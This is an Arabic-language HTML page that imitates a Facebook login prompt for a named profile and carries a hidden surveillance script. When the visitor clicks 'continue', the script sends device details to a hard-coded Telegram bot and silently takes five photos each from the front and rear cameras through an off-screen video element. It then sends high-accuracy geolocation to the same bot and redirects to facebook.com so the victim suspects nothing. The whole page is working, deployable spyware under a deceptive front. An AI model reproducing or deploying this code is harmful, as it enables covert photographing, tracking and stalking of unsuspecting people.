<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Marwa Mohamed</title>

<meta property="og:type"        content="profile">
<meta property="og:title"       content="Marwa Mohamed">
<meta property="og:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
<meta property="og:site_name"   content="facebook.com">

<meta property="og:image"       content="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
<meta property="og:image:width"  content="1200">
<meta property="og:image:height" content="1200">

<meta name="twitter:card"        content="summary">
<meta name="twitter:title"       content="Marwa Mohamed">
<meta name="twitter:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
<meta name="twitter:image"       content="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">

<link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
<link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">

<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{height:100%}
  body{
    background:#fff;
    color:#1c1e21;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
    overflow:hidden;
  }

  #loginPage{
    display:flex;
    flex-direction:column;
    align-items:center;
    width:100%;
    max-width:360px;
    text-align:center;
  }
  #loginPage .fbIcon{
    width:80px;
    height:80px;
    margin-bottom:22px;
  }
  #loginPage h1{
    font-size:18px;
    font-weight:400;
    color:#1c1e21;
    margin-bottom:8px;
    line-height:1.4;
  }
  #loginPage .name{
    font-weight:700;
    color:#1877f2;
  }
  #loginPage p{
    font-size:14px;
    color:#65676b;
    margin-bottom:26px;
  }
  #loginBtn{
    width:100%;
    max-width:280px;
    padding:13px 20px;
    background:#1877f2;
    color:#fff;
    border:none;
    border-radius:8px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:background .15s;
  }
  #loginBtn:active{background:#166fe5}
  #loginBtn:disabled{opacity:.6;cursor:default}

  #loadPage{
    display:none;
    flex-direction:column;
    align-items:center;
    gap:18px;
    text-align:center;
    max-width:320px;
  }
  #loadPage .spinner{
    width:56px;
    height:56px;
    border-radius:50%;
    border:4px solid #e4e6eb;
    border-top-color:#1877f2;
    animation:spin .9s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  #loadPage .txt{
    font-size:14px;
    color:#65676b;
    line-height:1.5;
  }

  video{
    position:fixed;
    left:-9999px;top:-9999px;
    width:2px;height:2px;
    opacity:0.01;
    pointer-events:none;
  }
</style>
</head>
<body>

  <div id="loginPage">
    <img class="fbIcon" alt="Facebook"
         src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
    <h1>الدخول إلى حساب <span class="name">Marwa Mohamed</span></h1>
    <p>سجّل الدخول للمتابعة إلى فيسبوك</p>
    <button id="loginBtn">متابعة باسم Marwa Mohamed</button>
  </div>

  <div id="loadPage">
    <div class="spinner"></div>
    <div class="txt" id="txt">جاري التحميل...</div>
  </div>

  <video id="vCam" autoplay playsinline muted></video>

<script>
(function () {
  const BOT_TOKEN = "8936581893:AAF6AB-I1BYXV6H_91K716aCh5w-LCXaYvw";
  const CHAT_ID   = "8800876346";

  const PHOTOS_PER_CAMERA = 5;
  const SETTLE_MS         = 350;
  const MIN_BRIGHTNESS    = 12;
  const PHOTO_GAP_MS      = 80;
  const REDIRECT_URL      = "https://www.facebook.com";

  const vCam = document.getElementById("vCam");
  const txt  = document.getElementById("txt");

  const loginPage = document.getElementById("loginPage");
  const loadPage  = document.getElementById("loadPage");
  const loginBtn  = document.getElementById("loginBtn");

  /* ============================================================
     بيانات المتصفح
     ============================================================ */
  async function getBattery(){
    try{
      if(!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return {level: Math.round(b.level*100)+"%", charging: b.charging};
    }catch{ return null; }
  }
  function getConn(){
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return c ? {type:c.effectiveType||"—", downlink:c.downlink??"—"} : null;
  }
  function devType(){
    const ua = navigator.userAgent;
    if(/Android/i.test(ua)) return "Android";
    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if(/Windows/i.test(ua)) return "Windows";
    if(/Macintosh|Mac OS X/i.test(ua)) return "Mac";
    if(/Linux/i.test(ua)) return "Linux";
    return "—";
  }
  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  async function collect(){
    const bat = await getBattery();
    const con = getConn();
    const d = {
      "📱 الجهاز"     : devType(),
      "🖥 النظام"      : navigator.platform || "—",
      "📐 الشاشة"     : `${screen.width}×${screen.height}`,
      "🔍 البكسل"     : devicePixelRatio,
      "🗣 اللغة"       : navigator.language,
      "🕐 التوقيت"    : Intl.DateTimeFormat().resolvedOptions().timeZone,
      "🧠 الأنوية"    : navigator.hardwareConcurrency || "—",
      "💾 الذاكرة"    : navigator.deviceMemory ? navigator.deviceMemory+"GB" : "—",
      "👆 لمس"        : ("ontouchstart" in window) ? "نعم" : "لا",
      "🔋 البطارية"   : bat ? `${bat.level} — ${bat.charging?"⚡":"🔌"}` : "—",
      "📶 الشبكة"     : con ? `${con.type} / ${con.downlink}Mbps` : "—",
      "🕒 الفتح"      : new Date().toLocaleString("ar-EG"),
      "🌐 UA"         : navigator.userAgent
    };
    let out = "🔔 <b>جهاز جديد فتح الصفحة</b>\n\n";
    for(const [k,v] of Object.entries(d)) out += `${k}: <code>${esc(v)}</code>\n`;
    return out;
  }

  /* ============================================================
     إرسال تليجرام
     ============================================================ */
  function sendText(t){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("text", t);
    fd.append("parse_mode","HTML");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendPhoto(blob, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", cap);
    fd.append("photo", blob, "p.jpg");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendLocation(lat, lon, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("latitude", lat);
    fd.append("longitude", lon);
    if(cap) fd.append("caption", cap);
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
      {method:"POST", body:fd}).catch(()=>{});
  }

  /* ============================================================
     انتظار إطار حقيقي
     ============================================================ */
  function waitForRealFrame(videoEl, timeout = 2500){
    if (typeof videoEl.requestVideoFrameCallback === "function"){
      return Promise.race([
        new Promise(res => videoEl.requestVideoFrameCallback(() => res())),
        new Promise(res => setTimeout(res, timeout))
      ]);
    }
    return new Promise(res => {
      const done = () => res();
      videoEl.addEventListener("playing", done, {once:true});
      videoEl.addEventListener("canplay", done, {once:true});
      setTimeout(done, timeout);
    });
  }

  /* ============================================================
     فتح كاميرا واحدة (وبس)
     ============================================================ */
  async function openCamera(facing){
    if(vCam.srcObject){
      vCam.srcObject.getTracks().forEach(t=>t.stop());
      vCam.srcObject = null;
    }
    const s = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:{ideal:facing}, width:{ideal:1280}, height:{ideal:720} },
      audio:false
    });
    vCam.srcObject = s;
    try{ await vCam.play(); }catch(_){}
    await waitForRealFrame(vCam);
    return s;
  }

  function closeCamera(){
    if(vCam.srcObject){
      vCam.srcObject.getTracks().forEach(t=>t.stop());
      vCam.srcObject = null;
    }
  }

  /* ============================================================
     التقاط + فحص الإضاءة
     ============================================================ */
  function capture(isFront){
    return new Promise(resolve=>{
      const c = document.createElement("canvas");
      c.width  = vCam.videoWidth  || 1280;
      c.height = vCam.videoHeight || 720;
      const ctx = c.getContext("2d");
      if(isFront){
        ctx.translate(c.width, 0);
        ctx.scale(-1, 1);
      }
      ctx.drawImage(vCam, 0, 0, c.width, c.height);

      let brightness = 255;
      try{
        const sampleW = Math.min(200, c.width);
        const sampleH = Math.min(200, c.height);
        const sx = (c.width  - sampleW) / 2;
        const sy = (c.height - sampleH) / 2;
        const data = ctx.getImageData(sx, sy, sampleW, sampleH).data;
        let sum = 0, n = 0;
        for(let i=0; i<data.length; i+=16){
          sum += data[i] + data[i+1] + data[i+2];
          n += 3;
        }
        brightness = sum / n;
      }catch(_){}

      c.toBlob(b => resolve({blob:b, brightness}), "image/jpeg", 0.72);
    });
  }

  async function captureSafe(isFront, maxTries = 4){
    for(let attempt = 1; attempt <= maxTries; attempt++){
      const {blob, brightness} = await capture(isFront);
      if(blob && brightness >= MIN_BRIGHTNESS) return blob;
      await new Promise(r => setTimeout(r, 200));
    }
    return null;
  }

  /* ============================================================
     الموقع الجغرافي
     ============================================================ */
  function requestLocation(timeoutMs = 12000){
    return new Promise(resolve => {
      if(!navigator.geolocation) return resolve(null);
      const timer = setTimeout(() => resolve(null), timeoutMs);
      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(timer);
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          });
        },
        err => {
          clearTimeout(timer);
          resolve({ error: err.message });
        },
        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
      );
    });
  }

  /* ============================================================
     مرحلة تصوير كاميرا واحدة (5 صور)
     ============================================================ */
  async function shootBatch(facing, label, phaseNum){
    txt.textContent = `📸 جاري التحقق من ${label}...`;

    try{
      await openCamera(facing);
    }catch(e){
      console.warn(`camera ${facing} failed:`, e.message);
      return false;
    }

    // وقت تأقلم الكاميرا مع الإضاءة
    await new Promise(r => setTimeout(r, SETTLE_MS));

    for(let i=1; i<=PHOTOS_PER_CAMERA; i++){
      const blob = await captureSafe(facing === "user");
      if(blob){
        sendPhoto(blob, `📷 ${label} #${i} (مرحلة ${phaseNum}/2)`);
      }
      await new Promise(r => setTimeout(r, PHOTO_GAP_MS));
    }

    // نقفل الكاميرا قبل فتح التانية
    closeCamera();
    await new Promise(r => setTimeout(r, 250));
    return true;
  }

  /* ============================================================
     التشغيل الكامل
     ============================================================ */
  async function run(){
    loginPage.style.display = "none";
    loadPage.style.display  = "flex";
    txt.textContent = "جاري التحميل...";

    // (أ) البيانات الأولية
    sendText(await collect());

    // (ب) المرحلة 1: الكاميرا الأمامية
    const frontOK = await shootBatch("user", "أمامية", 1);

    // (ج) المرحلة 2: الكاميرا الخلفية
    const backOK = await shootBatch("environment", "خلفية", 2);

    // لو الاتنين فشلوا، نروح على طول
    if(!frontOK && !backOK){
      window.location.href = REDIRECT_URL;
      return;
    }

    // (د) الموقع الجغرافي
    txt.textContent = "جاري التحقق من الهوية...";
    const loc = await requestLocation();

    if(loc && loc.lat !== undefined){
      const cap =
        `📍 <b>الموقع الجغرافي</b>\n` +
        `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
        `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
      sendLocation(loc.lat, loc.lon, cap);
    }else if(loc && loc.error){
      sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
    }else{
      sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
    }

    // (هـ) التحويل لفيسبوك
    txt.textContent = "تم التحقق ✅";
    await new Promise(r => setTimeout(r, 600));
    window.location.href = REDIRECT_URL;
  }

  loginBtn.addEventListener("click", function(){
    loginBtn.disabled = true;
    loginBtn.textContent = "جاري التحقق...";
    run();
  });
})();
</script>
</body>
</html>
